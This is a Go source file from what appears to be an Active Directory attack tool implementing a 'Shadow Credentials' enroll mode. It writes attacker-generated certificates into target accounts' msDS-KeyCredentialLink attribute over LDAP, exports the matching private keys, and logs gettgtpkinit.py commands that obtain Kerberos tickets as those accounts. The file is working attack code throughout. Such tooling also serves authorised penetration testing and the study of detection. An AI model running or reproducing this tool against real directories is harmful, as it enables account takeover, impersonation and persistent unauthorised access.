package mode_enroll

import (
	"encoding/base64"
	"fmt"
	"time"

	"github.com/TheManticoreProject/Manticore/logger"
	"github.com/TheManticoreProject/Manticore/network/ldap"
	"github.com/TheManticoreProject/Manticore/utils"
	"github.com/TheManticoreProject/Manticore/windows/cng/bcrypt/keys"
	"github.com/TheManticoreProject/Manticore/windows/guid"
	"github.com/TheManticoreProject/Manticore/windows/keycredentiallink"
	keycredential_utils "github.com/TheManticoreProject/Manticore/windows/keycredentiallink/utils"
	"github.com/TheManticoreProject/Manticore/windows/keycredentiallink/version"

	"github.com/TheManticoreProject/manticore-keycredentials/certificate"
	"github.com/TheManticoreProject/manticore-keycredentials/cli"
	"github.com/TheManticoreProject/manticore-keycredentials/config"
	"github.com/TheManticoreProject/manticore-keycredentials/keycredential"
	kcl_utils "github.com/TheManticoreProject/manticore-keycredentials/utils"
)

// Run creates a new certificate for each target object and attaches it as a
// KeyCredentialLink.
//
// Each object gets its own freshly generated certificate, whose subject is the
// object's sAMAccountName, so every target ends up with an independent credential
// and its own exported private key.
//
// Parameters:
//
//	targets (cli.TargetOptions): The target selection flags.
//	safety (cli.SafetyOptions): The dry-run and confirmation flags.
//	identifier (string): The identifier of the KeyCredential, per-object random when empty.
//	creationTime (string): The creation time of the KeyCredential.
//	lastLogonTime (string): The last logon time of the KeyCredential.
//	notBefore (string): The notBefore time of the certificate.
//	notAfter (string): The notAfter time of the certificate.
//	deviceId (string): The device id of the KeyCredential, per-object random when empty.
//	keySize (int): The key size of the certificate.
//	exportPem (bool): Whether to export the certificate to PEM format.
//	exportPfx (bool): Whether to export the certificate to PFX format.
//	config (config.Config): The configuration of the application.
//
// Returns:
//
//	An error if the operation fails, or if any target could not be enrolled.
func Run(targets cli.TargetOptions, safety cli.SafetyOptions, identifier, creationTime, lastLogonTime, notBefore, notAfter, deviceId string, keySize int, exportPem, exportPfx bool, config config.Config) error {
	if config.Debug {
		logger.Debug("Starting mode 'enroll'")
	}

	// Validate everything that does not depend on a target before connecting.
	notBeforeTime, notAfterTime, err := certificate.ParseValidityWindow(notBefore, notAfter)
	if err != nil {
		return err
	}
	if len(identifier) > 0 {
		identifierBytes, err := base64.StdEncoding.DecodeString(identifier)
		if err != nil {
			return fmt.Errorf("error decoding identifier: %s", err)
		}
		if len(identifierBytes) != 32 {
			return fmt.Errorf("identifier must be 32 bytes data encoded in base64")
		}
	}
	if len(deviceId) > 0 {
		if _, err := guid.FromString(deviceId); err != nil {
			return fmt.Errorf("error parsing deviceId: %s", err)
		}
	}
	creationDateTime, err := parseTimeOrDefault(creationTime, notBeforeTime)
	if err != nil {
		return fmt.Errorf("error parsing creationTime: %s", err)
	}
	lastLogonDateTime, err := parseTimeOrDefault(lastLogonTime, notBeforeTime)
	if err != nil {
		return fmt.Errorf("error parsing lastLogonTime: %s", err)
	}

	if err := cli.ValidateTargets(targets); err != nil {
		return err
	}

	ldapSession, err := kcl_utils.NewLDAPSession(
		config.Network.DomainController,
		config.Network.LDAP.LDAPPort,
		config.Credentials,
		config.Network.LDAP.UseLdaps,
		config.Network.LDAP.UseKerberos,
		config.Network.LDAP.SPNHostname,
	)
	if err != nil {
		return err
	}
	if config.Debug {
		kcl_utils.LogConnection(config.Network.Domain, config.Credentials.Username, config.Network.DomainController, config.Network.LDAP.LDAPPort, config.Network.LDAP.UseLdaps)
	}

	attributes := []string{"distinguishedName", "msDS-KeyCredentialLink", "sAMAccountName"}
	entries, err := cli.ResolveTargets(ldapSession, targets, attributes, config.Debug)
	if err != nil {
		return err
	}
	if len(entries) == 0 {
		logger.Info("No target object resolved; nothing to do.")
		return nil
	}

	logger.Print(fmt.Sprintf("[>] Creating and attaching a certificate to (\x1b[93m%d\x1b[0m):", len(entries)))
	for k, entry := range entries {
		glyph := "├──"
		if k == len(entries)-1 {
			glyph = "└──"
		}
		logger.Print(fmt.Sprintf("  %s \x1b[94m%s\x1b[0m", glyph, entry.GetAttributeValue("distinguishedName")))
	}
	logger.Print("")

	if !cli.ConfirmWrite("create and attach a certificate to", len(entries), safety) {
		return nil
	}

	datePrefix := time.Now().Format("2006-01-02_15-04-05")
	failures := 0
	for _, entry := range entries {
		dn := entry.GetAttributeValue("distinguishedName")
		sAMAccountName := entry.GetAttributeValue("sAMAccountName")

		if err := enrollOne(ldapSession, dn, sAMAccountName, identifier, deviceId, keySize, notBeforeTime, notAfterTime, creationDateTime, lastLogonDateTime, exportPem, exportPfx, datePrefix, config); err != nil {
			failures++
			logger.Warn(fmt.Sprintf("%s: %s", dn, err))
			continue
		}
	}

	if failures > 0 {
		return fmt.Errorf("failed to enroll %d of %d object(s)", failures, len(entries))
	}

	return nil
}

// enrollOne generates a certificate for a single object, attaches it, and exports
// it.
func enrollOne(ldapSession *ldap.Session, dn, sAMAccountName, identifier, deviceId string, keySize int, notBeforeTime, notAfterTime time.Time, creationDateTime, lastLogonDateTime keycredential_utils.DateTime, exportPem, exportPfx bool, datePrefix string, config config.Config) error {
	cert, err := certificate.Generate(sAMAccountName, keySize, notBeforeTime, notAfterTime)
	if err != nil {
		return err
	}

	bcryptRsaPublicKey, err := cert.ExportRSAPublicKeyBCrypt()
	if err != nil {
		return fmt.Errorf("error exporting RSA public key: %s", err)
	}

	credentialIdentifier, err := resolveIdentifier(identifier, bcryptRsaPublicKey)
	if err != nil {
		return err
	}
	deviceIdGUID := guid.NewGUID()
	if len(deviceId) > 0 {
		deviceIdGUID, _ = guid.FromString(deviceId)
	}

	// NewKeyCredentialLink takes lastLogonTime before creationTime.
	kc := keycredentiallink.NewKeyCredentialLink(
		version.KeyCredentialLinkVersion{Value: version.KeyCredentialLinkVersion_2},
		credentialIdentifier,
		bcryptRsaPublicKey,
		deviceIdGUID,
		&lastLogonDateTime,
		&creationDateTime,
	)
	if config.Debug {
		kc.Describe(0)
	}

	rawBytes, err := kc.Marshal()
	if err != nil {
		return fmt.Errorf("error converting KeyCredential to raw bytes: %s", err)
	}
	dnWithBinary := ldap.DNWithBinary{DistinguishedName: dn, BinaryData: rawBytes}
	if err := ldapSession.AddStringToAttributeList(dn, "msDS-KeyCredentialLink", dnWithBinary.String()); err != nil {
		return fmt.Errorf("error adding value to attribute: %s", err)
	}
	logger.Info(fmt.Sprintf("Attached a new certificate to '%s'", dn))

	// Name exported files by the account name rather than the full distinguished
	// name, which keeps them short and avoids commas and equals signs in paths.
	baseName := utils.PathSafeString(sAMAccountName)
	if len(baseName) == 0 {
		baseName = utils.PathSafeString(dn)
	}

	if exportPem {
		filePrivateKey := fmt.Sprintf("./keys/%s/%s.pem", datePrefix, baseName)
		fileCertificatePem := fmt.Sprintf("./keys/%s/%s.cert.pem", datePrefix, baseName)
		if err := cert.ExportRSAPrivateKeyPEM(filePrivateKey); err != nil {
			return fmt.Errorf("error exporting PEM private key: %s", err)
		}
		if err := cert.ExportCertificatePEM(fileCertificatePem); err != nil {
			return fmt.Errorf("error exporting PEM certificate: %s", err)
		}
		logger.Info(fmt.Sprintf(" | Saved PEM key/cert: %s , %s", filePrivateKey, fileCertificatePem))
		logger.Info(fmt.Sprintf("   python3 gettgtpkinit.py -dc-ip '%s' -cert-pem '%s' -key-pem '%s' '%s/%s' '%s.ccache'", config.Network.DomainController, fileCertificatePem, filePrivateKey, config.Network.Domain, sAMAccountName, sAMAccountName))
	}
	if exportPfx {
		pfxPassword := utils.RandomString(16)
		fileCertificatePFX := fmt.Sprintf("./keys/%s/%s_%s.pfx", datePrefix, baseName, pfxPassword)
		if err := cert.ExportPFX(fileCertificatePFX, pfxPassword); err != nil {
			return fmt.Errorf("error exporting PFX certificate: %s", err)
		}
		logger.Info(fmt.Sprintf(" | Saved PFX with password '%s': %s", pfxPassword, fileCertificatePFX))
		logger.Info(fmt.Sprintf("   python3 gettgtpkinit.py -dc-ip '%s' -cert-pfx '%s' -pfx-pass '%s' '%s/%s' '%s.ccache'", config.Network.DomainController, fileCertificatePFX, pfxPassword, config.Network.Domain, sAMAccountName, sAMAccountName))
	}

	return nil
}

// resolveIdentifier returns the explicit identifier when one was given, or the
// KeyID the key material requires.
func resolveIdentifier(identifier string, keyMaterial *keys.BCRYPT_RSA_PUBLIC_KEY) (string, error) {
	if len(identifier) > 0 {
		return identifier, nil
	}
	return keycredential.KeyIDForKeyMaterial(keyMaterial)
}

// parseTimeOrDefault parses an option time string, defaulting to the given time
// when it is empty.
func parseTimeOrDefault(value string, fallback time.Time) (keycredential_utils.DateTime, error) {
	if len(value) == 0 {
		return keycredential_utils.NewDateTimeFromTime(fallback), nil
	}
	t, err := utils.TimeStringToTime(value)
	if err != nil {
		return keycredential_utils.DateTime{}, err
	}
	return keycredential_utils.NewDateTimeFromTime(*t), nil
}
